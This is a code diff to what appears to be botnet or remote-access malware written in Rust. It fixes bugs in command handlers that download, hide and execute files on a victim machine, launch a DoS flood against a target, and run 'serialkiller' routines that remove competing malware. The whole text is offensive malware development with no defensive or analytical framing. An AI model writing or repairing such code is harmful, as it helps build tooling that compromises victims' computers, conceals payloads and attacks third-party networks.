@@ -165,24 +165,26 @@ async fn execute_download(args: &str) -> Result<String> {
     })?;
 
     // Hide the file
+    let mut actual_dest = dest.to_string();
     if hide {
         if cfg!(target_os = "windows") {
             let _ = std::process::Command::new("attrib")
                 .args(["+H", dest])
                 .output();
         } else {
-            // Rename to hidden dotfile
             let path = std::path::Path::new(dest);
             if let Some(parent) = path.parent() {
                 if let Some(name) = path.file_name() {
                     let hidden = parent.join(format!(".{}", name.to_string_lossy()));
-                    let _ = std::fs::rename(path, &hidden);
+                    if std::fs::rename(path, &hidden).is_ok() {
+                        actual_dest = hidden.to_string_lossy().to_string();
+                    }
                 }
             }
         }
     }
 
-    // Execute the file
+    // Execute the file (use actual_dest in case HIDE renamed it)
     if run {
         #[cfg(target_os = "windows")]
         {
@@ -273,7 +275,7 @@ async fn execute_dos(args: &str) -> Result<String> {
     }
 
     let target = tokens[0];
-    let secs: u64 = tokens.last().unwrap_or(&"0").parse().unwrap_or(0);
+    let secs: u64 = tokens.get(1).unwrap_or(&"0").parse().unwrap_or(0);
     let actual = secs.min(DOS_MAX_SECS);
 
     debug!("DoS flood: {} for {}s", target, actual);
@@ -358,7 +360,9 @@ async fn execute_permakill(args: &str) -> Result<String> {
 
 /// Execute serialkiller — competitor malware removal.
 async fn execute_serialkiller(args: &str) -> Result<String> {
-    let aggressive = args.to_lowercase().contains("run");
+    let aggressive = args.to_lowercase().contains("aggressive") 
+        || args.to_lowercase().contains("all")
+        || args.to_lowercase().contains("run");
     let cmds = SerialKiller::generate_kill_commands(aggressive);
     let mut output = String::new();
     for cmd in cmds.split('\n').filter(|s| !s.is_empty()) {
